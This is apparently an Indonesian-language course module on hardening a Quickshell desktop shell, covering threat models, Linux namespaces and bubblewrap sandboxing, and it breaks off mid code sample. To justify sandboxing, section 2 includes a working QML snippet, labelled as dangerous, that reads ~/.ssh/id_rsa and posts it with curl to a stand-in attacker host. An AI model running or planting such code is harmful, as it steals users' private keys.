# Kurikulum Fase 4

---

## 🔍 Audit

Sebelum masuk ke materi, berikut audit singkat struktur Fase 4 berdasarkan prinsip kelengkapan, urutan logis, dan potensi "loncatan" materi.

| Aspek Audit | Temuan | Rekomendasi |
|---|---|---|
| **Urutan Modul** | 4.1 (Threat Model & Sandboxing) → 4.2 (Lockscreen) → 4.3 (Greetd & D-Bus Filtering) | Urutan sudah logis: dari konsep dasar keamanan, ke komponen kritis (lockscreen), lalu ke hardening sesi secara menyeluruh. **Tidak ada loncatan besar.** |
| **Prasyarat Tersirat** | Modul 4.2 membutuhkan pemahaman `WlSessionLock` dan PAM; Modul 4.3 membutuhkan pemahaman D-Bus dan systemd user unit. | Keduanya sudah tercakup di Fase 3 (IPC, systemd) dan Modul 4.1 (isolasi proses). **Aman.** |
| **Materi yang Perlu Ditambahkan** | **(a)** Penjelasan lebih dalam tentang **`xdg-dbus-proxy`** (cara kerja filter, `--own` vs `--talk`) sebelum Modul 4.3. **(b)** **Audit log dan metadata** di Modul 4.1 perlu diperluas: `journalctl` untuk Quickshell, `loginctl`, dan cara meminimalkan jejak. **(c)** **Prosedur pemulihan lockscreen** (Modul 4.2) perlu mencakup skenario **lupa kata sandi** dan **PAM lockout**. | Saya akan menyisipkan penjelasan tambahan ini secara terintegrasi di modul yang relevan, dengan penanda **[TAMBAHAN]**. |
| **Kesalahan Daftar** | Tidak ditemukan kesalahan penomoran atau duplikasi. | — |

**Kesimpulan Audit:** Kurikulum Fase 4 sudah solid. Saya akan memperkaya dengan materi tambahan yang ditandai secara eksplisit, tanpa mengubah struktur asli.

---

# FASE 4 — KEAMANAN, ISOLASI, DAN ANONIMITAS

**Level:** Mahir–Expert · **Estimasi:** 6–8 minggu · **Prasyarat:** Fase 3 selesai.

> *"Keamanan sejati bukan tentang tembok yang tinggi, melainkan tentang memahami setiap celah dan mengisinya dengan kesadaran."*

Fase ini adalah puncak dari perjalanan Anda: setelah mampu membangun shell yang fungsional, kini saatnya memastikan bahwa shell tersebut **tidak menjadi pintu belakang** bagi sistem Anda. Kita akan bergerak dari filosofi ancaman, ke isolasi proses, lalu ke komponen paling sensitif (lockscreen), dan akhirnya ke hardening sesi secara menyeluruh.

---

# MODUL 4.1 — Threat Model, Sandboxing, dan Isolasi Proses

## 📋 Daftar Isi Modul 4.1

1.  Threat Model: Aset, Pelaku, dan Batas Kepercayaan
2.  Sifat Konfigurasi QML sebagai Kode Berhak Penuh
3.  Namespace Linux: Fondasi Isolasi
4.  Bubblewrap (`bwrap`): Sandbox Ringan untuk Proses Pembantu
5.  Sandbox Seluruh Shell: Hard Mode dan Jebakan Pewarisan
6.  Pemisahan Direktori Runtime/State dengan Pragma Quickshell
7.  Audit Akses dengan `strace`
8.  **[TAMBAHAN]** Kebersihan Log dan Metadata (Anonimitas)
9.  Latihan, Checkpoint, dan Visualisasi

---

## 1. Threat Model: Aset, Pelaku, dan Batas Kepercayaan

### 1.1 Deskripsi Konkret & Peran dalam Kurikulum

**Threat model** adalah dokumen tertulis yang menjawab tiga pertanyaan fundamental:
1.  **Apa yang ingin saya lindungi?** (aset)
2.  **Dari siapa saya melindunginya?** (pelaku/ancaman)
3.  **Di mana batas antara "dalam" dan "luar" sistem saya?** (batas kepercayaan)

Dalam konteks Quickshell, threat model adalah **langkah nol** sebelum menyentuh `bwrap` atau `strace`. Tanpa threat model, Anda akan menebak-nebak apa yang perlu di-sandbox dan apa yang tidak. Modul ini adalah fondasi yang menentukan **seluruh keputusan teknis** di sisa Fase 4.

### 1.2 Konsep Kunci & Filosofi Mendalam

Bayangkan rumah Anda. Anda tidak memasang alarm di setiap sudut tanpa alasan—Anda terlebih dahulu bertanya: *"Apa barang berharga saya? Siapa yang mungkin mencoba masuk? Dari pintu mana mereka bisa masuk?"* Itulah threat model.

**Filosofi inti:** **Keamanan adalah proses, bukan produk.** Tidak ada konfigurasi yang "sekali jadi langsung aman selamanya." Threat model harus ditinjau ulang setiap kali Anda menambah fitur baru ke shell (misalnya, saat menambahkan widget cuaca yang mengunduh data dari internet—itu menambah **permukaan serangan** baru).

**Tiga lapisan batas kepercayaan dalam Quickshell:**

1.  **Batas antara pengguna dan shell:** Shell berjalan dengan hak akses penuh pengguna. Jika shell dikompromikan, seluruh sesi pengguna dikompromikan.
2.  **Batas antara shell dan proses pembantu:** Proses pembantu (helper) memproses data yang mungkin tidak tepercaya (misalnya, hasil parsing JSON dari API cuaca). Sandbox di sini mencegah helper yang terkompromi menjalar ke sistem.
3.  **Batas antara shell dan sistem:** Layanan sistem (D-Bus sistem, systemd, dll.) memiliki kebijakan akses sendiri. Shell harus dibatasi agar tidak bisa menyalahgunakan akses ini.

### 1.3 Sintaks Dasar / Contoh Implementasi Inti: Template Threat Model

Berikut adalah template threat model satu halaman yang bisa langsung Anda isi. **Ini bukan kode QML**, melainkan dokumen Markdown yang menjadi "peta" bagi semua keputusan teknis Anda.


# Threat Model — [Nama Shell Anda]

## 1. Aset yang Dilindungi
- **Kredensial:** Kata sandi, kunci SSH, token API (mis. token GitHub di `~/.config/gh/hosts.yml`).
- **Data pribadi:** Dokumen di `~/Documents`, riwayat shell (`~/.bash_history`), konfigurasi email.
- **Integritas sistem:** File konfigurasi di `~/.config`, binary di `~/.local/bin`.
- **Anonimitas:** Alamat IP, metadata koneksi, log aktivitas.

## 2. Pelaku/Ancaman (dari yang paling mungkin hingga paling canggih)
| Pelaku | Kemampuan | Motivasi | Contoh Serangan |
|---|---|---|---|
| **Konfigurasi QML pihak ketiga** | Menjalankan kode QML sewenang-wenang dengan hak pengguna | Tidak disengaja (bug) atau sengaja (malware) | Membaca `~/.ssh/id_rsa` melalui `FileView`, mengirim data ke server jauh melalui `Process` + `curl` |
| **Proses pembantu yang terkompromi** | Mengeksekusi kode di dalam sandbox, tetapi bisa mencoba breakout | Mencuri data, memasang backdoor | Parser JSON berbahaya yang mengeksploitasi bug di library, lalu mencoba mengakses `~` atau jaringan |
| **Aplikasi yang diluncurkan dari launcher** | Hak akses penuh (jika tidak diisolasi) | Beragam | Aplikasi berbahaya yang dijalankan dari launcher shell mewarisi semua izin shell |
| **Penyerang jaringan** | Mencegat lalu lintas yang tidak terenkripsi | Mencuri kredensial, metadata | MITM pada koneksi HTTP dari widget cuaca |

## 3. Batas Kepercayaan
- **Dalam (Tepercaya):** Kode QML yang Anda tulis sendiri dan telah Anda audit. Proses pembantu yang berjalan di dalam `bwrap` dengan kebijakan ketat.
- **Luar (Tidak Tepercaya):** Konfigurasi QML dari sumber pihak ketiga. Data yang diunduh dari internet. Aplikasi yang diluncurkan dari launcher (kecuali jika diluncurkan melalui `systemd-run --user`).

## 4. Strategi Mitigasi (Berlapis)
1.  **Audit:** Setiap QML pihak ketiga harus dibaca dan dipahami sebelum dijalankan.
2.  **Sandbox helper:** Proses yang memproses data tidak tepercaya dijalankan di dalam `bwrap` tanpa akses jaringan dan tanpa akses ke `~`.
3.  **Batasi shell:** Gunakan `xdg-dbus-proxy` untuk menyaring D-Bus, dan hardening unit systemd.
4.  **Pemisahan direktori:** Gunakan pragma `ShellId` untuk memisahkan data/state/cache dari shell lain.
5.  **Anonimitas:** Minimalkan log, hapus metadata, gunakan koneksi terenkripsi.

**Penjelasan kata demi kata:**
- **`Aset`**: Segala sesuatu yang memiliki nilai bagi Anda dan ingin dilindungi.
- **`Pelaku`**: Entitas yang mungkin mencoba mengakses aset tanpa izin.
- **`Batas Kepercayaan`**: Garis imajiner yang memisahkan zona "tepercaya" dari "tidak tepercaya." Setiap kali data melintasi batas ini, diperlukan pemeriksaan.
- **`Mitigasi`**: Tindakan teknis untuk mengurangi risiko.

### 1.4 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **Threat model** | Dokumen terstruktur yang mengidentifikasi aset, ancaman, dan mitigasi. |
| **Attack surface (permukaan serangan)** | Total titik di mana penyerang dapat mencoba masuk. Setiap fitur baru (mis. widget cuaca) menambah permukaan serangan. |
| **Least privilege** | Prinsip memberikan hak akses **sekecil mungkin** yang diperlukan untuk suatu tugas. |
| **Trust boundary** | Batas antara dua zona dengan tingkat kepercayaan berbeda. Data yang melintasi batas harus divalidasi. |

### 1.5 Visualisasi: Peta Threat Model


```text
┌────────────────────────────────────────────────────────────────────┐
│                        ZONA TIDAK TEPERCAYA                        │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐  │
│  │ Internet     │  │ Konfigurasi  │  │ Aplikasi dari launcher   │  │
│  │ (API cuaca,  │  │ QML pihak    │  │ (jika tidak diisolasi)   │  │
│  │  RSS, dll.)  │  │ ketiga       │  │                          │  │
│  └──────┬───────┘  └──────┬───────┘  └────────────┬─────────────┘  │
└─────────┼─────────────────┼───────────────────────┼────────────────┘
          │                 │                       │
          ▼                 ▼                       ▼
┌────────────────────────────────────────────────────────────────────┐
│                      BATAS KEPERCAYAAN #1                          │
│  (Validasi input, audit QML, sandbox helper)                       │
└────────────────────────────────────────────────────────────────────┘
          │                 │                       │
          ▼                 ▼                       ▼
┌───────────────────────────────────────────────────────────────────┐
│                        ZONA TEPERCAYA                             │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  Quickshell (hak pengguna penuh)                            │  │
│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │  │
│  │  │ QML inti    │  │ Helper      │  │ FileView, Process   │  │  │
│  │  │ (Anda)      │  │ (bwrap)     │  │ (akses langsung)    │  │  │
│  │  └─────────────┘  └─────────────┘  └─────────────────────┘  │  │
│  └─────────────────────────────────────────────────────────────┘  │
│  ┌─────────────────────────────────────────────────────────────┐  │
│  │  Sistem (D-Bus, systemd, filesystem)                        │  │
│  └─────────────────────────────────────────────────────────────┘  │
└───────────────────────────────────────────────────────────────────┘
```

**Penjelasan diagram:**
- **Zona Tidak Tepercaya** di atas: semua yang berasal dari luar kendali Anda langsung.
- **Batas Kepercayaan #1**: di sinilah Anda menerapkan audit, sandbox, dan validasi.
- **Zona Tepercaya** di bawah: shell inti dan sistem. Namun, "tepercaya" di sini **bersyarat**—shell masih bisa menjadi vektor serangan jika tidak di-hardening.

### 1.6 Hubungan dengan Modul Lain

- **Prasyarat:** Modul 1.1 (Penguncian Instance) — Anda sudah memahami bahwa penguncian instance **bukan** mekanisme keamanan.
- **Melanjutkan ke:** Seluruh sisa Fase 4. Threat model adalah peta yang akan Anda gunakan di Modul 4.2 (lockscreen: aset apa yang dilindungi?) dan Modul 4.3 (greetd/D-Bus: batas kepercayaan mana yang diperketat?).
- **Kembali ke:** Fase 3 (IPC) — pemahaman tentang D-Bus dan systemd akan sangat membantu saat membahas Modul 4.3.

### 1.7 Sumber Referensi

- **Threat Modeling Manifesto:** [https://www.threatmodelingmanifesto.org/](https://www.threatmodelingmanifesto.org/) — Prinsip dan nilai threat modeling.
- **OWASP Threat Modeling:** [https://owasp.org/www-community/Threat_Modeling](https://owasp.org/www-community/Threat_Modeling) — Panduan praktis.
- **Arch Wiki: Security:** [https://wiki.archlinux.org/title/Security](https://wiki.archlinux.org/title/Security) — Dasar-dasar keamanan Arch Linux.

### 1.8 Tips dan Praktik Terbaik

- **Mulai dari yang kecil.** Threat model satu halaman lebih baik daripada tidak sama sekali. Jangan terjebak dalam analisis berlebihan.
- **Tinjau ulang setiap kali menambah fitur.** Widget baru = permukaan serangan baru.
- **Tulis dalam bahasa yang bisa dipahami.** Threat model bukan dokumen akademik; ia adalah alat kerja.
- **Prioritaskan berdasarkan kemungkinan × dampak.** Tidak semua ancaman setara.

### 1.9 Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| Menganggap threat model hanya untuk "sistem besar." | Setiap shell, sekecil apa pun, memiliki aset dan ancaman. Mulailah dari yang sederhana. |
| Menyalin threat model dari orang lain tanpa menyesuaikan. | Threat model harus **kontekstual**. Shell Anda unik; aset dan ancaman Anda juga unik. |
| Tidak pernah memperbarui threat model. | Jadwalkan tinjauan (mis. setiap akhir fase) atau tinjau saat menambah dependensi baru. |

---

## 2. Sifat Konfigurasi QML sebagai Kode Berhak Penuh

### 2.1 Deskripsi Konkret & Peran dalam Kurikulum

Bagian ini menjawab pertanyaan: *"Mengapa konfigurasi QML pihak ketiga berbahaya?"* Jawabannya: karena QML **bukan** format konfigurasi deklaratif seperti JSON atau YAML. QML adalah **bahasa pemrograman** yang dapat mengeksekusi kode arbitrer, membaca file, menjalankan proses, dan mengakses jaringan—semuanya dengan hak akses penuh pengguna yang menjalankannya.

Pemahaman ini krusial karena menjadi **dasar pembenaran** untuk semua teknik sandboxing dan isolasi yang akan dipelajari di modul ini.

### 2.2 Konsep Kunci & Filosofi Mendalam

Bayangkan Anda menerima resep masakan dari internet. Jika resep itu hanya daftar bahan (JSON), Anda bisa membacanya dan memutuskan apakah aman. Tetapi jika resep itu adalah **program yang menjalankan instruksi**—"ambil bahan dari lemari es, campur, lalu nyalakan kompor tanpa pengawasan"—Anda perlu memeriksa setiap barisnya.

QML adalah "resep yang menjalankan instruksi." Fitur-fitur Quickshell yang powerful—`Process`, `FileView`, `IpcHandler`—adalah **pisau bermata dua**:

- **Sisi baik:** Memungkinkan shell yang sangat dinamis dan terintegrasi.
- **Sisi buruk:** Konfigurasi QML dapat menjalankan `Process { command: ["curl", "http://evil.com/steal?data=" + bacaFile("~/.ssh/id_rsa")] }` tanpa Anda sadari.

**Prinsip kunci:** **Jangan pernah menjalankan QML yang belum Anda audit.** Tidak ada "mode aman" di Quickshell. Tidak ada sandbox bawaan. Penguncian instance (Modul 1.1) hanya mencegah bentrok, **bukan** menahan serangan.

**Apa yang bisa dilakukan QML dengan hak akses penuh:**

| Fitur Quickshell | Kemampuan | Risiko jika Disalahgunakan |
|---|---|---|
| `Process` | Menjalankan perintah shell arbitrer | Eksekusi kode, exfiltrasi data, pemasangan backdoor |
| `FileView` | Membaca/menulis file apa pun yang dapat diakses pengguna | Pencurian kredensial, modifikasi konfigurasi |
| `IpcHandler` | Menerima perintah dari proses lain | Eskalasi hak akses jika IPC tidak diamankan |
| `Quickshell.dataDir`, `stateDir`, `cacheDir` | Menulis ke direktori khusus shell | Jika direktori dapat diprediksi, penyerang dapat menanam file berbahaya |

### 2.3 Sintaks Dasar / Contoh Implementasi Inti: Demonstrasi Risiko

Berikut adalah contoh **QML berbahaya** (untuk tujuan edukasi) yang menunjukkan betapa mudahnya mengeksfiltrasi data. **Jangan pernah menjalankan kode ini.**

```qml
// ⚠️ CONTOH BERBAHAYA — HANYA UNTUK EDUKASI
import Quickshell
import Quickshell.Io

Scope {
    // 1. Membaca file kredensial
    FileView {
        id: sshKey
        path: Quickshell.env("HOME") + "/.ssh/id_rsa"
    }

    // 2. Mengirimkannya ke server jauh
    Process {
        command: [
            "curl", "-s", "-X", "POST",
            "-d", "key=" + sshKey.text(),
            "http://attacker.example.com/collect"
        ]
        running: sshKey.loaded  // Jalankan setelah file terbaca
    }
}
```

**Penjelasan kata demi kata:**
- `import Quickshell.Io`: Mengimpor modul I/O yang menyediakan `Process` dan `FileView`.
- `FileView { path: ... }`: Membaca file `~/.ssh/id_rsa` (kunci SSH pribadi) ke dalam properti `text()`.
- `Process { command: [...] }`: Menjalankan `curl` untuk mengirim isi file ke server penyerang.
- `running: sshKey.loaded`: Memastikan proses hanya berjalan setelah file selesai dibaca.

**Poin penting:** Kode di atas **valid secara sintaksis** dan akan berjalan tanpa peringatan jika Anda menempelkannya ke shell Anda. Tidak ada mekanisme di Quickshell yang mencegahnya. Inilah mengapa **audit** dan **sandbox** adalah satu-satunya pertahanan.

### 2.4 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **QML (Qt Modeling Language)** | Bahasa deklaratif untuk membangun UI Qt, tetapi juga **Turing-complete** (dapat mengeksekusi logika arbitrer). |
| **Arbitrary code execution** | Kemampuan menjalankan kode apa pun yang diinginkan penyerang. |
| **Exfiltration** | Pengiriman data secara tidak sah ke pihak luar. |
| **Supply chain attack** | Serangan melalui dependensi atau konfigurasi pihak ketiga yang tampak tepercaya. |

### 2.5 Visualisasi: Alur Eksekusi QML Berbahaya

```text
[Konfigurasi QML Pihak Ketiga]
         │
         ▼
┌─────────────────────────────┐
│ Quickshell memuat QML       │
│ (tanpa sandbox, tanpa       │
│  peringatan)                │
└─────────────┬───────────────┘
              │
              ▼
┌─────────────────────────────┐
│ FileView membaca            │
│ ~/.ssh/id_rsa               │
└─────────────┬───────────────┘
              │
              ▼
┌─────────────────────────────┐
│ Process menjalankan curl    │
│ → http://attacker.com       │
└─────────────┬───────────────┘
              │
              ▼
         [DATA BOCOR]
```

### 2.6 Hubungan dengan Modul Lain

- **Prasyarat:** Modul 1.1 (Penguncian Instance) — Anda sudah tahu bahwa penguncian instance bukan keamanan.
- **Melanjutkan ke:** Bagian 3 (Namespace Linux) dan 4 (Bubblewrap) — solusi teknis untuk membatasi dampak QML berbahaya.
- **Terkait:** Modul 4.3 (D-Bus filtering) — QML juga dapat mengirim pesan D-Bus; penyaringan D-Bus membatasi kemampuan ini.

### 2.7 Sumber Referensi

- **Quickshell Process:** [https://quickshell.org/docs/types/Quickshell.Io/Process](https://quickshell.org/docs/types/Quickshell.Io/Process) — Dokumentasi resmi `Process`.
- **Quickshell FileView:** [https://quickshell.org/docs/types/Quickshell.Io/FileView](https://quickshell.org/docs/types/Quickshell.Io/FileView) — Dokumentasi resmi `FileView`.
- **QML Security Considerations:** [https://doc.qt.io/qt-6/qml-security.html](https://doc.qt.io/qt-6/qml-security.html) — Panduan keamanan QML dari Qt.

### 2.8 Tips dan Praktik Terbaik

- **Audit sebelum jalankan.** Baca setiap baris QML pihak ketiga. Jika Anda tidak memahaminya, jangan jalankan.
- **Gunakan `git diff`** saat memperbarui konfigurasi pihak ketiga untuk melihat perubahan.
- **Pisahkan shell pribadi dan shell eksperimental.** Jalankan shell eksperimental di VM atau dengan sandbox penuh.
- **Jangan pernah menyimpan kredensial di direktori yang dapat diakses shell tanpa enkripsi.** Gunakan `gpg` atau `pass` untuk manajemen kredensial.

### 2.9 Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| Menganggap QML sama seperti JSON (hanya data). | Ingat: QML adalah **kode**. Perlakukan seperti Anda memperlakukan skrip shell. |
| Menjalankan konfigurasi dari sumber "terpercaya" tanpa audit. | "Terpercaya" bukan jaminan. Bahkan pengembang baik pun bisa membuat kesalahan. Audit tetap diperlukan. |
| Mengandalkan Quickshell untuk "mode aman." | Tidak ada mode aman. Sandbox harus Anda terapkan sendiri. |

---

## 3. Namespace Linux: Fondasi Isolasi

### 3.1 Deskripsi Konkret & Peran dalam Kurikulum

Sebelum kita menyentuh `bwrap`, kita perlu memahami **apa yang sebenarnya dilakukan** oleh sandbox di level kernel. Jawabannya adalah **namespace**. Namespace adalah fitur kernel Linux yang memungkinkan proses melihat "pandangan terpisah" atas sumber daya sistem—seolah-olah proses tersebut memiliki salinan sendiri dari sumber daya tersebut.

Modul ini adalah **jembatan konseptual** antara threat model (Bagian 1) dan implementasi `bwrap` (Bagian 4). Tanpa memahami namespace, Anda hanya akan menghafal sintaks `bwrap` tanpa tahu mengapa ia bekerja.

### 3.2 Konsep Kunci & Filosofi Mendalam

Bayangkan sebuah gedung apartemen. Setiap penghuni memiliki **kunci** untuk unitnya sendiri, tetapi mereka berbagi lift, koridor, dan atap. Namespace adalah seperti memberikan **gedung terpisah** kepada setiap proses: mereka memiliki lift sendiri, koridor sendiri, bahkan atap sendiri—meskipun secara fisik, semuanya berjalan di atas infrastruktur yang sama (kernel).

**Filosofi inti:** **Isolasi bukan berarti "tidak ada akses," melainkan "akses yang terbatas pada pandangan tertentu."** Proses di dalam namespace tetap bisa mengakses sumber daya—tetapi hanya sumber daya yang **terlihat** oleh namespace tersebut.

**Jenis-jenis namespace yang relevan:**

| Namespace | Apa yang Diisolasi | Contoh Penggunaan |
|---|---|---|
| **Mount (`mnt`)** | Pohon direktori (filesystem) | Proses hanya melihat `/usr` read-only, tidak melihat `~` |
| **PID (`pid`)** | Daftar proses | Proses hanya melihat dirinya sendiri dan anak-anaknya; tidak bisa melihat atau mengirim sinyal ke proses host |
| **Network (`net`)** | Antarmuka jaringan, rute, port | Proses tidak memiliki akses jaringan sama sekali (loopback saja) |
| **IPC (`ipc`)** | Antrean pesan System V, semaphore, shared memory | Proses tidak bisa berkomunikasi dengan proses host melalui IPC |
| **UTS (`uts`)** | Hostname dan domain name | Proses melihat hostname sendiri |
| **User (`user`)** | UID/GID, kapabilitas | Proses bisa berjalan sebagai "root" di dalam namespace, tetapi sebenarnya bukan root di host |
| **Cgroup (`cgroup`)** | Hirarki cgroup | Proses tidak bisa melihat atau memodifikasi cgroup host |

**Prinsip kunci:** **Setiap namespace yang di-unshare mengurangi permukaan serangan.** Namun, tidak semua namespace harus selalu di-unshare. Misalnya, jika helper perlu mengakses jaringan (mis. untuk mengunduh data cuaca), Anda mungkin **tidak** meng-unshare network namespace, tetapi tetap meng-unshare mount dan PID.

### 3.3 Sintaks Dasar / Contoh Implementasi Inti: Melihat Namespace di Sistem Anda

Anda dapat melihat namespace apa yang dimiliki suatu proses melalui `/proc/[pid]/ns/`:

```bash
# Lihat namespace milik proses shell Anda saat ini
ls -l /proc/$$/ns/

# Output contoh:
# lrwxrwxrwx 1 user user 0 ... cgroup -> 'cgroup:[4026531835]'
# lrwxrwxrwx 1 user user 0 ... ipc -> 'ipc:[4026531839]'
# lrwxrwxrwx 1 user user 0 ... mnt -> 'mnt:[4026531841]'
# lrwxrwxrwx 1 user user 0 ... net -> 'net:[4026531992]'
# lrwxrwxrwx 1 user user 0 ... pid -> 'pid:[4026531836]'
# lrwxrwxrwx 1 user user 0 ... user -> 'user:[4026531837]'
# lrwxrwxrwx 1 user user 0 ... uts -> 'uts:[4026531838]'
```

**Penjelasan kata demi kata:**
- `ls -l`: Menampilkan isi direktori secara detail.
- `/proc/$$/ns/`: `$$` adalah PID shell saat ini; `/proc/[pid]/ns/` adalah direktori yang berisi symlink ke namespace proses tersebut.
- Setiap baris menunjukkan **jenis namespace** (`cgroup`, `ipc`, `mnt`, dll.) dan **ID unik** namespace tersebut (angka dalam `[...]`).

**Membandingkan namespace dua proses:**

```bash
# Bandingkan namespace shell Anda dengan namespace proses lain (mis. PID 1)
for ns in mnt pid net ipc uts user; do
  a=$(readlink /proc/$$/ns/$ns)
  b=$(readlink /proc/1/ns/$ns)
  if [ "$a" = "$b" ]; then
    echo "$ns: SAMA"
  else
    echo "$ns: BERBEDA ($a vs $b)"
  fi
done
```

**Penjelasan:**
- Loop `for ns in ...` mengiterasi jenis-jenis namespace.
- `readlink` membaca target symlink (ID namespace).
- Jika ID sama, kedua proses berada di namespace yang sama; jika berbeda, mereka terisolasi untuk sumber daya tersebut.

### 3.4 Terminologi Esensial

| Istilah | Definisi |
|---|---|
| **Namespace** | Fitur kernel yang membungkus sumber daya sistem global ke dalam abstraksi yang hanya terlihat oleh proses di dalam namespace tersebut. |
| **`unshare`** | Syscall (dan perintah) untuk membuat namespace baru dan memindahkan proses ke dalamnya. |
| **Mount namespace** | Namespace yang mengisolasi pohon direktori (filesystem). |
| **PID namespace** | Namespace yang mengisolasi ruang PID; proses di dalamnya hanya melihat proses di namespace yang sama. |
| **User namespace** | Namespace yang memetakan UID/GID di dalam namespace ke UID/GID yang berbeda di host. Memungkinkan proses non-root memiliki hak "root" di dalam namespace. |

### 3.5 Visualisasi: Namespace sebagai "Kotak Terpisah"

```text
HOST KERNEL
┌───────────────────────────────────────────────────────────────────┐
│  ┌─────────────────────────┐  ┌────────────────────────────────┐  │
│  │ Namespace Host (default)│  │ Namespace Sandbox (baru)       │  │
│  │                         │  │                                │  │
│  │  Mount: /home, /usr,    │  │  Mount: /usr (read-only),      │  │
│  │         /etc, dll.      │  │         /proc (baru), /dev     │  │
│  │  PID: 1 (systemd), ...  │  │  PID: 1 (proses sandbox), ...  │  │
│  │  Net: eth0, wlan0, ...  │  │  Net: (kosong, hanya loopback) │  │
│  │  IPC: antrean host      │  │  IPC: antrean terpisah         │  │
│  │  UTS: hostname host     │  │  UTS: hostname sandbox         │  │
│  └─────────────────────────┘  └────────────────────────────────┘  │
│                                                                   │
│  Proses di namespace sandbox TIDAK BISA melihat atau mengakses    │
│  sumber daya di namespace host (kecuali jika secara eksplisit     │
│  di-bind-mount atau diizinkan).                                   │
└───────────────────────────────────────────────────────────────────┘
```

### 3.6 Hubungan dengan Modul Lain

- **Prasyarat:** Bagian 2 (QML sebagai kode berbahaya) — namespace adalah **alat** untuk membatasi dampak QML berbahaya.
- **Melanjutkan ke:** Bagian 4 (Bubblewrap) — `bwrap` adalah **pembungkus** yang membuat dan mengonfigurasi namespace ini untuk Anda.
- **Terkait:** Modul 4.3 (systemd hardening) — systemd juga menggunakan namespace (melalui direktif seperti `PrivateTmp`, `ProtectHome`) untuk mengisolasi service.

### 3.7 Sumber Referensi

- **Linux man-pages: namespaces(7):** [https://man7.org/linux/man-pages/man7/namespaces.7.html](https://man7.org/linux/man-pages/man7/namespaces.7.html) — Referensi lengkap semua namespace.
- **Linux man-pages: user_namespaces(7):** [https://man7.org/linux/man-pages/man7/user_namespaces.7.html](https://man7.org/linux/man-pages/man7/user_namespaces.7.html) — Detail tentang user namespace.
- **Arch Wiki: Linux Containers:** [https://wiki.archlinux.org/title/Linux_Containers](https://wiki.archlinux.org/title/Linux_Containers) — Ikhtisar teknologi container di Arch.

### 3.8 Tips dan Praktik Terbaik

- **Gunakan `lsns` untuk melihat semua namespace di sistem Anda:** `lsns -t mnt` menampilkan semua mount namespace. Ini membantu Anda memahami betapa banyak isolasi yang sudah ada.
- **Jangan meng-unshare semua namespace secara membabi buta.** Pahami kebutuhan helper Anda. Jika helper perlu jaringan, jangan `--unshare-net`.
- **User namespace adalah fondasi `bwrap` tanpa root.** Memungkinkan proses non-root memiliki "root" di dalam namespace, tetapi tidak di host.

### 3.9 Potensi Kesalahan Umum & Solusi

| Kesalahan | Solusi |
|---|---|
| Mengira namespace = container. | Container (Docker, Podman) **menggunakan** namespace, tetapi juga menambahkan lapisan lain (cgroups, image, dll.). Namespace adalah primitif kernel. |
| Meng-unshare PID namespace tetapi lupa bahwa proses anak akan menjadi PID 1 di namespace baru. | PID 1 di namespace baru memiliki tanggung jawab khusus (mis. menangani zombie). Gunakan `--as-pid-1` atau biarkan `bwrap` menanganinya. |
| Tidak menyadari bahwa `--unshare-all` juga meng-unshare user namespace, yang dapat menyebabkan masalah dengan akses file. | Pahami setiap flag. `--unshare-all` adalah titik awal yang baik, tetapi mungkin perlu disesuaikan. |

---

## 4. Bubblewrap (`bwrap`): Sandbox Ringan untuk Proses Pembantu

### 4.1 Deskripsi Konkret & Peran dalam Kurikulum

**Bubblewrap** (`bwrap`) adalah alat sandbox ringan yang menggunakan namespace Linux untuk menciptakan lingkungan terisolasi bagi suatu proses. Ia awalnya dikembangkan untuk Flatpak, tetapi kini menjadi alat standalone yang dapat digunakan di mana saja.

Dalam konteks Quickshell, `bwrap` adalah **lapisan pertahanan kedua**: setelah Anda mengaudit QML (lapisan pertama), Anda menjalankan **proses pembantu** yang memproses data tidak tepercaya di dalam `bwrap`. Jika helper tersebut terkompromi, kerusakan terbatas pada lingkungan sandbox.

Modul ini adalah **inti teknis** dari Fase 4.1. Anda akan mempelajari cara mengonfigurasi `bwrap` untuk berbagai skenario, dari yang sederhana (tanpa jaringan, tanpa home) hingga yang kompleks (dengan akses terbatas ke filesystem dan D-Bus).

### 4.2 Konsep Kunci & Filosofi Mendalam

**Analogi:** Sandbox adalah **ruang tahanan berdinding kaca**. Program di dalamnya boleh bekerja—membaca file, menjalankan perhitungan—tetapi hanya dengan alat yang Anda taruh di dalam ruangan itu. Dinding kaca memungkinkan Anda melihat apa yang terjadi, tetapi program tidak bisa menembusnya.

**Filosofi inti:** **Bubblewrap bukan tentang "memblokir" program, melainkan tentang "mendefinisikan ulang dunia" yang dilihat program.** Program di dalam `bwrap` tidak menyadari bahwa ia sedang di-sandbox; ia hanya melihat filesystem yang lebih kecil, jaringan yang kosong, dan daftar proses yang pendek.

**Prinsip-prinsip konfigurasi `bwrap`:**

1.  **Mulai dari kosong, lalu tambahkan.** `bwrap` menciptakan filesystem namespace baru yang **kosong** (root pada tmpfs). Anda harus secara eksplisit **mengikat (bind)** apa yang diperlukan. Ini adalah kebalikan dari pendekatan "mulai dari penuh, lalu blokir."
2.  **Read-only secara default.** Gunakan `--ro-bind` untuk sebagian besar filesystem. Hanya gunakan `--bind` (read-write) untuk direktori yang benar-benar perlu ditulis.
3.  **Unshare sebanyak mungkin.** `--unshare-all` adalah titik awal yang baik, lalu tambahkan kembali akses yang diperlukan (mis. jaringan) dengan `--share-net`.
4.  **`--die-with-parent` adalah wajib.** Memastikan proses sandbox mati jika `bwrap` (atau Quickshell) mati. Tanpa ini, proses yatim dapat bertahan dan menjadi zombie.

**Apa yang bisa dan tidak bisa di-sandbox:**

| Bisa di-sandbox | Tidak bisa di-sandbox (dengan `bwrap` saja) |
|---|---|
| Akses filesystem (mount namespace) | Akses ke perangkat keras secara langsung (mis. GPU) |
| Akses jaringan (network namespace) | Escalation melalui bug kernel |
| Daftar proses (PID namespace) | Side-channel attacks (mis. timing, cache) |
| IPC (IPC namespace) | Akses ke D-Bus sistem (perlu penyaringan tambahan) |
| Hostname (UTS namespace) | — |

### 4.3 Sintaks Dasar / Contoh Implementasi Inti

#### Contoh 1: Sandbox Minimal untuk Helper yang Hanya Membaca `/proc/loadavg`

Ini adalah contoh dari materi asli, dengan penjelasan tambahan.

```qml
// Sandbox untuk satu proses pembantu: tanpa jaringan, tanpa home, PID terpisah
Process {
    command: [
        'bwrap',
        '--ro-bind', '/usr', '/usr',
        '--symlink', 'usr/lib', '/lib',
